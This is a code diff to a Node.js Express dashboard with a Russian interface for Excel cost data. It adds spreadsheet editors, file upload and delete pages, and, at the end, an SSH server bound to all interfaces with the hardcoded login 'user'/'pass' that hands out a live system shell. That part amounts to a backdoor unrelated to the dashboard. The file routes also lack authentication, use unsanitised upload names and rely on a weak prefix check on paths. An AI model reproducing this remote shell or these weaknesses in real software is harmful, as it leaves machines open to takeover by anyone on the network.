@@ -1,9 +1,26 @@
+'use strict';
 const express = require('express');
 const path    = require('path');
+const fs      = require('fs');
+const { rmSync, mkdirSync, existsSync, readdirSync, lstatSync } = fs;
 const xlsx    = require('xlsx');
+const fileUpload = require('express-fileupload');
+const { main: generateData } = require('./Itog2');
+const { Server: SSHServer } = require('ssh2');
+const { spawn, exec } = require('child_process');
+const { generateKeyPairSync } = require('crypto');
 
 const app  = express();
 const PORT = 2500;
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+app.use(fileUpload());
+
+function esc(str) {
+  return String(str).replace(/[&<>"']/g, ch => ({
+    '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;','\'':'&#39;'
+  }[ch]));
+}
 
 // Отображаемые имена столбцов
 const displayNames = {
@@ -20,12 +37,66 @@ const displayNames = {
   Kvadrat:      'Квадрат'
 };
 
-// Читаем Excel
-const workbook  = xlsx.readFile(path.join(__dirname, 'combined_output.xlsx'));
-const sheetName = 'GroupedData';
-if (!workbook.Sheets[sheetName]) throw new Error(`Лист "${sheetName}" не найден`);
-const sheet = workbook.Sheets[sheetName];
-const rows  = xlsx.utils.sheet_to_json(sheet, { defval: '' });
+// Функция чтения данных из Excel
+function loadData() {
+  const file = path.join(__dirname, 'combined_output.xlsx');
+  if (!existsSync(file)) return [];
+  const workbook  = xlsx.readFile(file);
+  const sheetName = 'GroupedData';
+  if (!workbook.Sheets[sheetName]) return [];
+  const sheet = workbook.Sheets[sheetName];
+  const rows  = xlsx.utils.sheet_to_json(sheet, { defval: '' });
+  return rows.filter(r =>
+    cols.every(c => (r[c] ?? '').toString().trim() !== '')
+  );
+}
+
+function loadNLSR() {
+  const file = path.join(__dirname, 'NLSR.xlsx');
+  if (!existsSync(file)) return [];
+  const wb = xlsx.readFile(file);
+  const sh = wb.Sheets[wb.SheetNames[0]];
+  return xlsx.utils
+    .sheet_to_json(sh, { defval: '' })
+    .filter(r => Object.values(r).some(v => String(v).trim() !== ''));
+}
+
+function saveNLSR(rows) {
+  const clean = rows
+    .map(r => ({
+      Name: (r.Name || '').trim(),
+      Keyword: (r.Keyword || '').trim()
+    }))
+    .filter(r => r.Name !== '' || r.Keyword !== '');
+  const wb = xlsx.utils.book_new();
+  const ws = xlsx.utils.json_to_sheet(clean);
+  xlsx.utils.book_append_sheet(wb, ws, 'Sheet1');
+  xlsx.writeFile(wb, path.join(__dirname, 'NLSR.xlsx'));
+}
+
+function loadTEP() {
+  const file = path.join(__dirname, 'TEP.xlsx');
+  if (!existsSync(file)) return [];
+  const wb = xlsx.readFile(file);
+  const sh = wb.Sheets[wb.SheetNames[0]];
+  return xlsx.utils.sheet_to_json(sh, { defval: '' });
+}
+
+function saveTEP(rows) {
+  const wb = xlsx.utils.book_new();
+  const ws = xlsx.utils.json_to_sheet(rows);
+  xlsx.utils.book_append_sheet(wb, ws, 'Sheet1');
+  xlsx.writeFile(wb, path.join(__dirname, 'TEP.xlsx'));
+}
+
+function loadCombined(sheet = 'MainData') {
+  const file = path.join(__dirname, 'combined_output.xlsx');
+  if (!existsSync(file)) return [];
+  const wb = xlsx.readFile(file);
+  const sh = wb.Sheets[sheet] || wb.Sheets[wb.SheetNames[0]];
+  if (!sh) return [];
+  return xlsx.utils.sheet_to_json(sh, { defval: '' });
+}
 
 // Все колонки и фильтрация пустых
 const cols = [
@@ -33,9 +104,6 @@ const cols = [
   'Num 1','Num 2','НЛСР группа',
   'Year','Quarter','всего','TEP','Kvadrat'
 ];
-const data = rows.filter(r =>
-  cols.every(c => (r[c] ?? '').toString().trim() !== '')
-);
 
 // Фильтруемые столбцы (без «всего», «TEП», «Kvadrat»)
 const filterCols = cols.filter(c => !['всего','TEP','Kvadrat'].includes(c));
@@ -49,7 +117,478 @@ filterCols.forEach(c => {
 app.use('/static', express.static(path.join(__dirname, 'public')));
 
 // API для данных
-app.get('/data', (req, res) => res.json(data));
+app.get('/data', (req, res) => {
+  try {
+    res.json(loadData());
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// Запуск обработки .gge и обновления Excel
+app.get('/generate', async (req, res) => {
+  try {
+    await generateData();
+    res.json({ status: 'ok' });
+  } catch (e) {
+    console.error(e);
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// Страница редактирования НЛСР
+app.get('/edit-nlsr', (req, res) => {
+  res.send(`<!DOCTYPE html>
+  <html lang="ru">
+  <head>
+    <meta charset="UTF-8">
+    <title>Редактирование NLSR.xlsx</title>
+    <link rel="stylesheet" href="/static/style.css">
+  </head>
+  <body>
+    <div class="container">
+      <div class="header">
+        <h1>NLSR.xlsx</h1>
+        <div>
+          <a class="btn" href="/">На главную</a>
+          <a class="btn" href="/download-nlsr">Скачать</a>
+        </div>
+      </div>
+      <form id="uploadForm" method="post" enctype="multipart/form-data" action="/upload-nlsr" style="margin-bottom:10px">
+        <input type="file" name="file" accept=".xlsx" required>
+        <button type="submit" class="btn">Загрузить</button>
+      </form>
+      <button id="addRow" class="btn">Добавить строку</button>
+      <div class="table-wrapper"><table class="table" id="editTable"></table></div>
+      <button id="addRowBottom" class="btn">Добавить строку</button>
+      <button id="saveBtn" class="btn">Сохранить</button>
+    </div>
+    <script>
+      fetch('/api/nlsr').then(r=>r.json()).then(json=>{
+        const table=document.getElementById('editTable');
+        table.innerHTML='<tr><th>Name</th><th>Keyword</th></tr>';
+        json.forEach(row=>{
+          const tr=document.createElement('tr');
+          ['Name','Keyword'].forEach(k=>{
+            const td=document.createElement('td');
+            td.contentEditable='true';
+            td.textContent=row[k]||'';
+            tr.appendChild(td);
+          });
+          table.appendChild(tr);
+        });
+      });
+      function addRow(){
+        const tr=document.createElement('tr');
+        ['',''].forEach(()=>{
+          const td=document.createElement('td');
+          td.contentEditable='true';
+          tr.appendChild(td);
+        });
+        document.getElementById('editTable').appendChild(tr);
+      }
+      document.getElementById('addRow').onclick=addRow;
+      document.getElementById('addRowBottom').onclick=addRow;
+      document.getElementById('saveBtn').onclick=()=>{
+        const rows=[];
+        document.querySelectorAll('#editTable tr').forEach((tr,i)=>{
+          if(i===0) return;
+          const t=tr.querySelectorAll('td');
+          rows.push({Name:t[0].textContent.trim(),Keyword:t[1].textContent.trim()});
+        });
+        fetch('/api/nlsr',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({rows})})
+          .then(r=>r.json()).then(()=>alert('Сохранено'));
+      };
+    </script>
+  </body></html>`);
+});
+
+// Страница редактирования TEP
+app.get('/edit-tep', (req, res) => {
+  res.send(`<!DOCTYPE html>
+  <html lang="ru">
+  <head>
+    <meta charset="UTF-8">
+    <title>Редактирование TEP.xlsx</title>
+    <link rel="stylesheet" href="/static/style.css">
+  </head>
+  <body>
+    <div class="container">
+      <div class="header">
+        <h1>TEP.xlsx</h1>
+        <div>
+          <a class="btn" href="/">На главную</a>
+          <a class="btn" href="/download-tep">Скачать</a>
+        </div>
+      </div>
+      <form id="uploadForm" method="post" enctype="multipart/form-data" action="/upload-tep" style="margin-bottom:10px">
+        <input type="file" name="file" accept=".xlsx" required>
+        <button type="submit" class="btn">Загрузить</button>
+      </form>
+      <button id="addRow" class="btn">Добавить строку</button>
+      <div class="table-wrapper"><table class="table" id="editTable"></table></div>
+      <button id="addRowBottom" class="btn">Добавить строку</button>
+      <button id="saveBtn" class="btn">Сохранить</button>
+    </div>
+    <script>
+      fetch('/api/tep').then(r=>r.json()).then(json=>{
+        const table=document.getElementById('editTable');
+        table.innerHTML='<tr><th>Type</th><th>Name</th><th>Num 1</th><th>Num 2</th><th>Tep</th></tr>';
+        json.forEach(row=>{
+          const tr=document.createElement('tr');
+          ['Type','Name','Num 1','Num 2','Tep'].forEach(k=>{
+            const td=document.createElement('td');
+            td.contentEditable='true';
+            td.textContent=row[k]||'';
+            tr.appendChild(td);
+          });
+          table.appendChild(tr);
+        });
+      });
+      function addRow(){
+        const tr=document.createElement('tr');
+        ['','','','',''].forEach(()=>{
+          const td=document.createElement('td');
+          td.contentEditable='true';
+          tr.appendChild(td);
+        });
+        document.getElementById('editTable').appendChild(tr);
+      }
+      document.getElementById('addRow').onclick=addRow;
+      document.getElementById('addRowBottom').onclick=addRow;
+      document.getElementById('saveBtn').onclick=()=>{
+        const rows=[];
+        document.querySelectorAll('#editTable tr').forEach((tr,i)=>{
+          if(i===0) return;
+          const t=tr.querySelectorAll('td');
+          rows.push({Type:t[0].textContent.trim(),Name:t[1].textContent.trim(),
+            'Num 1':t[2].textContent.trim(),'Num 2':t[3].textContent.trim(),Tep:t[4].textContent.trim()});
+        });
+        fetch('/api/tep',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({rows})})
+          .then(r=>r.json()).then(()=>alert('Сохранено'));
+      };
+    </script>
+  </body></html>`);
+});
+
+// Генерация HTML для дерева файлов
+function listDirHtml(base, sub = '') {
+  const dir = path.join(base, sub);
+  if (!existsSync(dir)) return '';
+  const entries = readdirSync(dir, { withFileTypes: true })
+    .sort((a,b)=>a.name.localeCompare(b.name));
+  let html = '';
+  for (const e of entries) {
+    const rel = path.join(sub, e.name);
+    const del = `<form style="display:inline" method="post" action="/delete" onsubmit="return confirm('Удалить ${esc(rel)}?')">`+
+                `<input type="hidden" name="file" value="${esc(rel)}">`+
+                `<button type="submit">Удалить</button></form>`;
+    if (e.isDirectory()) {
+      html += `<li class="folder"><span>${esc(e.name)}</span> ${del}`+
+              `<ul>` + listDirHtml(base, rel) + `</ul></li>`;
+    } else {
+      html += `<li class="file">${esc(e.name)} ${del}</li>`;
+    }
+  }
+  return html;
+}
+
+// Генерация HTML для одной папки в виде сетки
+function listDirGrid(base, sub = '', view = 'grid') {
+  const dir = path.join(base, sub);
+  if (!existsSync(dir)) return '';
+  const entries = readdirSync(dir, { withFileTypes: true })
+    .sort((a, b) => a.name.localeCompare(b.name));
+  let html = '<div class="file-grid">';
+  for (const e of entries) {
+    const rel = path.join(sub, e.name);
+    const del = `<form method="post" action="/delete" onsubmit="return confirm('Удалить ${esc(rel)}?')">`+
+                `<input type="hidden" name="file" value="${esc(rel)}">`+
+                `<input type="hidden" name="dir" value="${esc(sub)}">`+
+                `<input type="hidden" name="view" value="${esc(view)}">`+
+                `<button type="submit">Удалить</button></form>`;
+    if (e.isDirectory()) {
+      html += `<div class="item folder">`+
+              `<a href="/upload?dir=${encodeURIComponent(rel)}&view=${view}" class="icon folder-icon"></a>`+
+              `<div class="name">${esc(e.name)}</div>`+
+              `${del}</div>`;
+    } else {
+      const ext = path.extname(e.name).slice(1).toLowerCase();
+      html += `<div class="item file" data-ext="${esc(ext)}">`+
+              `<div class="icon file-icon"></div>`+
+              `<div class="name">${esc(e.name)}</div>`+
+              `${del}</div>`;
+    }
+  }
+  html += '</div>';
+  return html;
+}
+
+function listDirList(base, sub = '', view = 'list') {
+  const dir = path.join(base, sub);
+  if (!existsSync(dir)) return '';
+  const entries = readdirSync(dir, { withFileTypes: true })
+    .sort((a, b) => a.name.localeCompare(b.name));
+  let html = '<table class="file-table"><thead><tr>'+
+             '<th>Имя</th><th>Дата изменения</th><th>Тип</th><th>Размер</th><th></th>'+
+             '</tr></thead><tbody>';
+  for (const e of entries) {
+    const rel = path.join(sub, e.name);
+    const stats = lstatSync(path.join(dir, e.name));
+    const mtime = new Date(stats.mtimeMs).toLocaleString('ru-RU');
+    const type = e.isDirectory() ? 'Папка' : (path.extname(e.name).slice(1).toUpperCase() || 'Файл');
+    const size = e.isDirectory() ? '' : stats.size;
+    const del = `<form method="post" action="/delete" onsubmit="return confirm('Удалить ${esc(rel)}?')">`+
+                `<input type="hidden" name="file" value="${esc(rel)}">`+
+                `<input type="hidden" name="dir" value="${esc(sub)}">`+
+                `<input type="hidden" name="view" value="${esc(view)}">`+
+                `<button type="submit">Удалить</button></form>`;
+    const name = e.isDirectory()
+      ? `<a href="/upload?dir=${encodeURIComponent(rel)}&view=${view}"><span class="icon-sm folder-icon"></span>${esc(e.name)}</a>`
+      : `<span class="icon-sm file-icon"></span>${esc(e.name)}`;
+    html += `<tr><td>${name}</td><td>${mtime}</td><td>${esc(type)}</td><td>${size}</td><td>${del}</td></tr>`;
+  }
+  html += '</tbody></table>';
+  return html;
+}
+
+// Загрузка новых .gge файлов в папку "Объекты" и просмотр содержимого
+app.get('/upload', (req, res) => {
+  const base = path.join(__dirname, 'Объекты');
+  const sub  = req.query.dir ? req.query.dir.replace(/\\+/g,'/') : '';
+  const view = req.query.view === 'list' ? 'list' : 'grid';
+  const current = path.normalize(path.join(base, sub));
+  if (!current.startsWith(base)) return res.status(400).send('Некорректный путь');
+  if (!existsSync(current)) mkdirSync(current, { recursive: true });
+  const tree = view === 'list' ? listDirList(base, sub, view) : listDirGrid(base, sub, view);
+  const toggle = `<a class="btn" href="/upload?dir=${encodeURIComponent(sub)}&view=${view==='grid'?'list':'grid'}">${view==='grid'?'Список':'Квадратики'}</a>`;
+    res.send(`<!DOCTYPE html>
+  <html lang="ru">
+  <head>
+    <meta charset="UTF-8">
+    <title>Загрузка объектов</title>
+    <link rel="stylesheet" href="/static/style.css">
+  </head>
+  <body>
+    <div class="container">
+      <div class="header"><h1>Добавить объекты</h1>
+        <div>
+          <a class="btn" href="/">На главную</a>
+          <a class="btn" href="/open-folder">Открыть папку C:\\Users\\User\\4</a>
+        </div>
+      </div>
+      <div class="view-toggle">${sub ? `<a class="btn" href="/upload?dir=${encodeURIComponent(path.dirname(sub))}&view=${view}">Назад</a>` : ''} ${toggle}</div>
+      ${tree}
+      <form method="post" enctype="multipart/form-data">
+        <input type="hidden" name="dir" value="${esc(sub)}">
+        <input type="hidden" name="view" value="${esc(view)}">
+        <input type="file" name="files" multiple required>
+        <button type="submit" class="btn">Загрузить</button>
+      </form>
+      <form method="post" action="/mkdir">
+        <input type="hidden" name="dir" value="${esc(sub)}">
+        <input type="hidden" name="view" value="${esc(view)}">
+        <input type="text" name="name" placeholder="Новая папка" required>
+        <button type="submit" class="btn">Создать папку</button>
+      </form>
+    </div>
+  </body></html>`);
+});
+
+app.post('/upload', (req, res) => {
+  if (!req.files || !req.files.files) {
+    return res.status(400).send('Нет файлов');
+  }
+  const base = path.join(__dirname, 'Объекты');
+  const sub  = req.body.dir ? req.body.dir.replace(/\\+/g,'/') : '';
+  const view = req.body.view === 'list' ? 'list' : 'grid';
+  const dir  = path.normalize(path.join(base, sub));
+  if (!dir.startsWith(base)) return res.status(400).send('Некорректный путь');
+  if (!existsSync(dir)) mkdirSync(dir, { recursive: true });
+  const files = Array.isArray(req.files.files) ? req.files.files : [req.files.files];
+  files.forEach(f => f.mv(path.join(dir, f.name)));
+  res.redirect('/upload?dir=' + encodeURIComponent(sub) + '&view=' + view);
+});
+
+app.post('/delete', (req, res) => {
+  const base = path.join(__dirname, 'Объекты');
+  const sub  = req.body.dir ? req.body.dir.replace(/\\+/g,'/') : '';
+  const view = req.body.view === 'list' ? 'list' : 'grid';
+  const target = path.normalize(path.join(base, req.body.file || ''));
+  if (!target.startsWith(base)) return res.status(400).send('Некорректный путь');
+  if (existsSync(target)) {
+    const st = lstatSync(target);
+    if (st.isDirectory()) rmSync(target, { recursive: true, force: true });
+    else rmSync(target);
+  }
+  res.redirect('/upload?dir=' + encodeURIComponent(sub) + '&view=' + view);
+});
+
+app.post('/mkdir', (req, res) => {
+  const base = path.join(__dirname, 'Объекты');
+  const sub  = req.body.dir ? req.body.dir.replace(/\\+/g,'/') : '';
+  const view = req.body.view === 'list' ? 'list' : 'grid';
+  const target = path.normalize(path.join(base, sub, req.body.name || ''));
+  if (!target.startsWith(base)) return res.status(400).send('Некорректный путь');
+  mkdirSync(target, { recursive: true });
+  res.redirect('/upload?dir=' + encodeURIComponent(sub) + '&view=' + view);
+});
+
+app.get('/open-folder', (req, res) => {
+  const folder = 'C:\\Users\\User\\4';
+  const cmd = process.platform === 'win32'
+    ? `start "" "${folder}"`
+    : `xdg-open "${folder}"`;
+  exec(cmd, err => {
+    if (err) console.error('Ошибка открытия папки', err);
+    res.redirect('back');
+  });
+});
+
+// API NLSR.xlsx
+app.get('/api/nlsr', (req, res) => {
+  try { res.json(loadNLSR()); }
+  catch(e){ res.status(500).json({ error: e.message }); }
+});
+
+app.post('/api/nlsr', (req, res) => {
+  try { saveNLSR(req.body.rows || []); res.json({ status: 'ok' }); }
+  catch(e){ console.error(e); res.status(500).json({ error: e.message }); }
+});
+
+// Загрузка и выгрузка NLSR.xlsx
+app.get('/download-nlsr', (req, res) => {
+  const file = path.join(__dirname, 'NLSR.xlsx');
+  existsSync(file) ? res.download(file) : res.status(404).send('NLSR.xlsx not found');
+});
+
+app.post('/upload-nlsr', (req, res) => {
+  if (!req.files || !req.files.file) return res.status(400).send('Нет файла');
+  req.files.file.mv(path.join(__dirname, 'NLSR.xlsx'), err => {
+    if (err) return res.status(500).send('Ошибка загрузки');
+    res.redirect('/edit-nlsr');
+  });
+});
+
+// API TEP.xlsx
+app.get('/api/tep', (req, res) => {
+  try { res.json(loadTEP()); }
+  catch(e){ res.status(500).json({ error: e.message }); }
+});
+
+app.post('/api/tep', (req, res) => {
+  try { saveTEP(req.body.rows || []); res.json({ status: 'ok' }); }
+  catch(e){ console.error(e); res.status(500).json({ error: e.message }); }
+});
+
+// Загрузка и выгрузка TEP.xlsx
+app.get('/download-tep', (req, res) => {
+  const file = path.join(__dirname, 'TEP.xlsx');
+  existsSync(file) ? res.download(file) : res.status(404).send('TEP.xlsx not found');
+});
+
+app.post('/upload-tep', (req, res) => {
+  if (!req.files || !req.files.file) return res.status(400).send('Нет файла');
+  req.files.file.mv(path.join(__dirname, 'TEP.xlsx'), err => {
+    if (err) return res.status(500).send('Ошибка загрузки');
+    res.redirect('/edit-tep');
+  });
+});
+
+// Выдача готового Excel
+app.get('/combined', (req, res) => {
+  res.download(path.join(__dirname, 'combined_output.xlsx'));
+});
+
+// Просмотр содержимого combined_output.xlsx
+app.get('/view-combined', (req, res) => {
+  const rows = loadCombined();
+  if (!rows.length) return res.send('<p>Файл combined_output.xlsx не найден</p>');
+  const headers = Object.keys(rows[0]);
+  const head = headers.map(h =>
+    `<th data-col="${esc(h)}"><span>${esc(h)}</span><div class="resizer"></div></th>`
+  ).join('');
+  const body = rows.map(r =>
+    `<tr>${headers.map(h => `<td>${esc(r[h])}</td>`).join('')}</tr>`
+  ).join('');
+  res.send(`<!DOCTYPE html>
+  <html lang="ru">
+  <head>
+    <meta charset="UTF-8">
+    <title>combined_output.xlsx</title>
+    <link rel="stylesheet" href="/static/style.css">
+  </head>
+  <body>
+    <div class="container">
+      <div class="header"><h1>combined_output.xlsx</h1>
+        <a class="btn" href="/">На главную</a>
+        <a class="btn" href="/combined">Скачать</a>
+      </div>
+      <div class="zoom-controls">Масштаб:
+        <input type="range" id="zoom" min="50" max="150" value="100">
+        <span id="zoomVal">100%</span>
+      </div>
+      <div class="table-wrapper wide">
+        <table class="table">
+          <thead><tr>${head}</tr></thead>
+          <tbody>${body}</tbody>
+        </table>
+      </div>
+    </div>
+    <script>
+      const zoomInput = document.getElementById('zoom');
+      const zoomVal   = document.getElementById('zoomVal');
+      const wrapper   = document.querySelector('.table-wrapper');
+      const table     = wrapper.querySelector('table');
+      function applyZoom() {
+        const scale = zoomInput.value / 100;
+        table.style.transform = 'scale(' + scale + ')';
+        zoomVal.textContent = zoomInput.value + '%';
+      }
+      zoomInput.addEventListener('input', applyZoom);
+      applyZoom();
+
+      const headers = Array.from(table.querySelectorAll('th'));
+      const widths = JSON.parse(localStorage.getItem('combinedColWidths') || '{}');
+      headers.forEach((th, i) => {
+        const name = th.dataset.col;
+        const stored = widths[name];
+        if (stored) {
+          th.style.width = stored + 'px';
+          table.querySelectorAll('tbody tr').forEach(tr => {
+            const td = tr.children[i];
+            if (td) td.style.width = stored + 'px';
+          });
+        }
+        const resizer = th.querySelector('.resizer');
+        let startX, startW;
+        resizer.addEventListener('mousedown', e => {
+          document.body.classList.add('resizing');
+          startX = e.clientX;
+          startW = th.offsetWidth;
+          function onMove(ev) {
+            const w = Math.max(40, startW + ev.clientX - startX);
+            th.style.width = w + 'px';
+            table.querySelectorAll('tbody tr').forEach(tr => {
+              const td = tr.children[i];
+              if (td) td.style.width = w + 'px';
+            });
+          }
+          function onUp(ev) {
+            document.body.classList.remove('resizing');
+            document.removeEventListener('mousemove', onMove);
+            document.removeEventListener('mouseup', onUp);
+            const w = th.offsetWidth;
+            widths[name] = w;
+            localStorage.setItem('combinedColWidths', JSON.stringify(widths));
+          }
+          document.addEventListener('mousemove', onMove);
+          document.addEventListener('mouseup', onUp);
+        });
+      });
+    </script>
+  </body></html>`);
+});
 
 // Главная страница
 app.get('/', (req, res) => {
@@ -80,11 +619,13 @@ app.get('/', (req, res) => {
       flex: 1; margin: 0 2px; padding: 4px; font-size: 0.9em;
       border: 1px solid #888; background: #eee; border-radius: 3px; cursor: pointer;
     }
+    #generateBtn { margin-left:10px; padding:6px 14px; background:#28a745; color:#fff; border:1px solid #28a745; border-radius:20px; cursor:pointer; }
+    .btn { margin-left:10px; padding:6px 14px; background:#28a745; color:#fff; border:1px solid #28a745; border-radius:20px; text-decoration:none; }
     .checkboxes label { display: block; margin-bottom: 3px; }
     .table-wrapper { overflow-x: auto; }
     table { width: 100%; min-width: 1400px; border-collapse: collapse; }
     th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
-    th { background: #4CAF50; color: #fff; cursor: pointer; user-select: none; }
+    th { background: #4CAF50; color: #fff; cursor: pointer; user-select: none; position: static; }
     th.sort-asc::after { content: ' ▲'; }
     th.sort-desc::after { content: ' ▼'; }
     tr:nth-child(even) { background: #f9f9f9; }
@@ -98,6 +639,12 @@ app.get('/', (req, res) => {
       <div class="stats">
         Среднее ${displayNames.Kvadrat}: <span id="avgKvadrat">0.00</span>
       </div>
+      <button id="generateBtn">Обновить данные</button>
+      <a class="btn" href="/upload">Добавить объекты</a>
+      <a class="btn" href="/edit-nlsr">Править NLSR</a>
+      <a class="btn" href="/edit-tep">Править TEP</a>
+      <a class="btn" href="/combined">Скачать Excel</a>
+      <a class="btn" href="/view-combined">Просмотр Excel</a>
     </div>
     <div class="filters">
       ${Object.entries(keyMap).map(([id,key]) => `
@@ -132,6 +679,10 @@ app.get('/', (req, res) => {
 
     document.addEventListener('DOMContentLoaded', () => {
       fetch('/data').then(r=>r.json()).then(json=>{
+        if (json.error) {
+          document.body.innerHTML = '<p style="color:red">' + json.error + '</p>';
+          return;
+        }
         allData = json;
         Object.entries(keyMap).forEach(([id, key]) => {
           const container = document.getElementById('checkboxes-' + id);
@@ -151,6 +702,9 @@ app.get('/', (req, res) => {
           });
         });
         renderTable();
+      });
+      document.getElementById('generateBtn').addEventListener('click', () => {
+        fetch('/generate').then(r=>r.json()).then(()=>location.reload());
       });
       document.addEventListener('click', e => {
         Object.keys(keyMap).forEach(id => {
@@ -241,3 +795,34 @@ app.get('/', (req, res) => {
 app.listen(PORT, () => {
   console.log('Server запущен: http://localhost:' + PORT);
 });
+
+// --- SSH Server -----------------------------------------------------------
+function startSSH() {
+  const { privateKey } = generateKeyPairSync('rsa', { modulusLength: 2048 });
+  const hostKey = privateKey.export({ type: 'pkcs1', format: 'pem' });
+  const ssh = new SSHServer({ hostKeys: [hostKey] }, client => {
+    client.on('authentication', ctx => {
+      if (ctx.method === 'password' && ctx.username === 'user' && ctx.password === 'pass')
+        ctx.accept();
+      else ctx.reject();
+    }).on('ready', () => {
+      client.on('session', accept => {
+        const session = accept();
+        session.once('shell', acceptShell => {
+          const stream = acceptShell();
+          const shellCmd = process.platform === 'win32' ? 'cmd.exe' : '/bin/sh';
+          const shell = spawn(shellCmd, [], { env: process.env });
+          stream.on('data', d => shell.stdin.write(d));
+          shell.stdout.on('data', d => stream.write(d));
+          shell.stderr.on('data', d => stream.write(d));
+          shell.on('exit', () => client.end());
+        });
+      });
+    });
+  });
+  ssh.listen(2222, '0.0.0.0', () => {
+    console.log('SSH сервер слушает порт 2222 (логин: user, пароль: pass)');
+  });
+}
+
+startSSH();
